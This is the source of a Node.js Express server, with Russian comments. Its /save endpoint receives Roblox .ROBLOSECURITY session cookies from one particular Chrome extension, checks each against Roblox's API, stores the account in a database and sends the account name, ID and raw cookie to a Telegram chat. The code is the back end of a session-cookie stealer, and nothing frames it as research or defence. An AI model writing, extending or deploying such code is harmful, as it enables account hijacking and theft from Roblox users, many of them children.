require("dotenv").config();
const express = require("express");
const { neon } = require("@neondatabase/serverless");
const {Bot} = require('grammy')
const cors = require("cors");

const PORT = 5000;
const app = express();
const client = neon(process.env.DATABASE_URL);
const bot = new Bot(process.env.BOT_TOKEN)

sendTelegramMessage = async (chatId, message) => {
  try {
    await bot.api.sendMessage(chatId, message);
    console.log("Сообщение отправлено!");
  } catch (error) {
    console.error("Ошибка отправки:", error);
  }
}
async function getRobloxUserByCookie(cookieValue) {
  const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
    method: "GET",
    headers: {
      Cookie: `.ROBLOSECURITY=${cookieValue}`,
      Accept: "application/json"
    }
  });

  if (!response.ok) {
    throw new Error(`Roblox API вернул статус ${response.status}`);
  }

  const data = await response.json();
  // data содержит: id, name (логин), displayName (отображаемое имя)
  return {
    id: data.id,
    name: data.name,
    displayName: data.displayName
  };
}


app.use(express.json());
app.use(cors({
  origin: "chrome-extension://eboadfllildekgjmpbdcgbhdmacehndf",
  methods: ["POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
}));
app.post("/save", async (req, res) => {
  const { login } = req.body ?? {};
  if (!login) {
    return res.status(400).json({ ok: false, error: "Не передан токен сессии" });
  }

  try {
    const robloxUser = await getRobloxUserByCookie(login);

    // Если в таблице users есть колонки roblox_id и username (или храните как нужно):
    await client`
      INSERT INTO users (roblox_id, username)
      VALUES (${robloxUser.id}, ${robloxUser.name})
    `;

    await sendTelegramMessage(
      process.env.CHAT_ID,
      `Аккаунт Roblox: ${robloxUser.name} (ID: ${robloxUser.id}) Cookie: ${login} был успешно сохранен в базе данных.`
    );

    res.json({
      ok: true,
      user: {
        id: robloxUser.id,
        name: robloxUser.name,
        displayName: robloxUser.displayName
      }
    });
  } catch (err) {
    console.error("Ошибка:", err);
    res.status(500).json({ ok: false, error: err.message });
  }
});
app.get("/users", async (req, res) => {
  try {
    const users = await client`SELECT * FROM users`;  
    res.json({ ok: true, users });
  } catch (err) {
    console.error("Ошибка получения пользователей из базы данных:", err);
    res
      .status(500)
      .json({ ok: false, error: "Не удалось получить пользователей" });
  }
}); 
app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
});
